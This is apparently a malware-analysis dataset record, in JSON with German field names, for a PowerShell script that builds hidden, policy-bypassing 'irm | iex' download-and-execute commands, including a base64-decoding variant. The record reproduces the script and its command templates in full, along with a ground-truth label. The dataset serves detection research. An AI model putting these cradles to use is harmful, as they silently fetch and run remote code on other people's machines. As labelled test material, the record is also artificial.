@@ -1,0 +1,106 @@
+{
+  "meta": {
+    "quelldatei": "tech_000_makeirm.ps1",
+    "sha256": "be4ad4c460e68881384b2bd262fc0104c082838ff4a85394add2dd1ca54e641a",
+    "groesse_bytes": 2129,
+    "zeilen": 56,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')",
+      "Basic",
+      "BASE64",
+      "Enter the script name (without extension)",
+      "Enter the irm link",
+      "https://",
+      "^https://",
+      "\r\n\r\n        # Check if $scriptName is blank, and construct the command accordingly\r\n        if ([string]::IsNullOrWhiteSpace($scriptName)) {\r\n            $scriptName = \"IRM_Command\"\r\n        }\r\n\r\n        if ($choice -eq ",
+      ") {\r\n            # Ask for function name for iex (allow blank input)\r\n            $functionName = Read-Host \"Enter the function name for iex (leave blank if none)\"\r\n\r\n            # Check if $functionName is blank, and construct the command accordingly\r\n            if ([string]::IsNullOrWhiteSpace($functionName)) {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex\"\r\n            } else {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex;$functionName\"\r\n            }\r\n        } elseif ($choice -eq ",
+      ") {\r\n            # Form the command\r\n            $command = @\"\r\npowershell -NoP -W H -Ep Bypass iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm $link))))\r\n\"@\r\n        }\r\n\r\n        # Display the command to the user\r\n        Write-Host \"Generated Command:\" -ForegroundColor Cyan\r\n        Write-Host $command -ForegroundColor Green\r\n\r\n        # Save the command to a .txt file on the desktop\r\n        $desktopPath = [System.Environment]::GetFolderPath(",
+      "$scriptName.txt",
+      "Command saved to $txtFilePath",
+      "Invalid choice. Exiting..."
+    ],
+    "string_anzahl_gesamt": 13,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')",
+      "Basic",
+      "BASE64",
+      "Enter the script name (without extension)",
+      "Enter the irm link",
+      "https://",
+      "^https://",
+      "\r\n\r\n        # Check if $scriptName is blank, and construct the command accordingly\r\n        if ([string]::IsNullOrWhiteSpace($scriptName)) {\r\n            $scriptName = \"IRM_Command\"\r\n        }\r\n\r\n        if ($choice -eq ",
+      ") {\r\n            # Ask for function name for iex (allow blank input)\r\n            $functionName = Read-Host \"Enter the function name for iex (leave blank if none)\"\r\n\r\n            # Check if $functionName is blank, and construct the command accordingly\r\n            if ([string]::IsNullOrWhiteSpace($functionName)) {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex\"\r\n            } else {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex;$functionName\"\r\n            }\r\n        } elseif ($choice -eq ",
+      ") {\r\n            # Form the command\r\n            $command = @\"\r\npowershell -NoP -W H -Ep Bypass iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm $link))))\r\n\"@\r\n        }\r\n\r\n        # Display the command to the user\r\n        Write-Host \"Generated Command:\" -ForegroundColor Cyan\r\n        Write-Host $command -ForegroundColor Green\r\n\r\n        # Save the command to a .txt file on the desktop\r\n        $desktopPath = [System.Environment]::GetFolderPath(",
+      "$scriptName.txt",
+      "Command saved to $txtFilePath",
+      "Invalid choice. Exiting..."
+    ],
+    "string_anzahl_gesamt": 13,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Join-Path",
+      "Out-File",
+      "Read-Host",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "noprofile": 3
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')",
+      "Basic",
+      "BASE64",
+      "Enter the script name (without extension)",
+      "Enter the irm link",
+      "https://",
+      "^https://",
+      "\r\n\r\n        # Check if $scriptName is blank, and construct the command accordingly\r\n        if ([string]::IsNullOrWhiteSpace($scriptName)) {\r\n            $scriptName = \"IRM_Command\"\r\n        }\r\n\r\n        if ($choice -eq ",
+      ") {\r\n            # Ask for function name for iex (allow blank input)\r\n            $functionName = Read-Host \"Enter the function name for iex (leave blank if none)\"\r\n\r\n            # Check if $functionName is blank, and construct the command accordingly\r\n            if ([string]::IsNullOrWhiteSpace($functionName)) {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex\"\r\n            } else {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex;$functionName\"\r\n            }\r\n        } elseif ($choice -eq ",
+      ") {\r\n            # Form the command\r\n            $command = @\"\r\npowershell -NoP -W H -Ep Bypass iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm $link))))\r\n\"@\r\n        }\r\n\r\n        # Display the command to the user\r\n        Write-Host \"Generated Command:\" -ForegroundColor Cyan\r\n        Write-Host $command -ForegroundColor Green\r\n\r\n        # Save the command to a .txt file on the desktop\r\n        $desktopPath = [System.Environment]::GetFolderPath(",
+      "$scriptName.txt",
+      "Command saved to $txtFilePath",
+      "Invalid choice. Exiting..."
+    ],
+    "string_anzahl_gesamt": 13,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Join-Path",
+      "Out-File",
+      "Read-Host",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "noprofile": 3
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "function Create-irm {\r\n    # Prompt user for choice\r\n    $choice = Read-Host \"Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')\"\r\n\r\n    if ($choice -eq 'Basic' -or $choice -eq 'BASE64') {\r\n\r\n\t\t# Ask for script name\r\n        $scriptName = Read-Host \"Enter the script name (without extension)\"\r\n\r\n        # Ask for irm link\r\n        $link = Read-Host \"Enter the irm link\"\r\n\r\n        # Remove \"https://\" from the link\r\n        $link = $link -replace '^https://', ''\r\n\r\n        # Check if $scriptName is blank, and construct the command accordingly\r\n        if ([string]::IsNullOrWhiteSpace($scriptName)) {\r\n            $scriptName = \"IRM_Command\"\r\n        }\r\n\r\n        if ($choice -eq 'Basic') {\r\n            # Ask for function name for iex (allow blank input)\r\n            $functionName = Read-Host \"Enter the function name for iex (leave blank if none)\"\r\n\r\n            # Check if $functionName is blank, and construct the command accordingly\r\n            if ([string]::IsNullOrWhiteSpace($functionName)) {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex\"\r\n            } else {\r\n                $command = \"powershell -w h -NoP -Ep Bypass irm $link|iex;$functionName\"\r\n            }\r\n        } elseif ($choice -eq 'BASE64') {\r\n            # Form the command\r\n            $command = @\"\r\npowershell -NoP -W H -Ep Bypass iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm $link))))\r\n\"@\r\n        }\r\n\r\n        # Display the command to the user\r\n        Write-Host \"Generated Command:\" -ForegroundColor Cyan\r\n        Write-Host $command -ForegroundColor Green\r\n\r\n        # Save the command to a .txt file on the desktop\r\n        $desktopPath = [System.Environment]::GetFolderPath('Desktop')\r\n        $txtFilePath = Join-Path -Path $desktopPath -ChildPath \"$scriptName.txt\"\r\n        $command | Out-File -FilePath $txtFilePath -Encoding UTF8\r\n\r\n        Write-Host \"Command saved to $txtFilePath\" -ForegroundColor Yellow\r\n    } else {\r\n   ",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
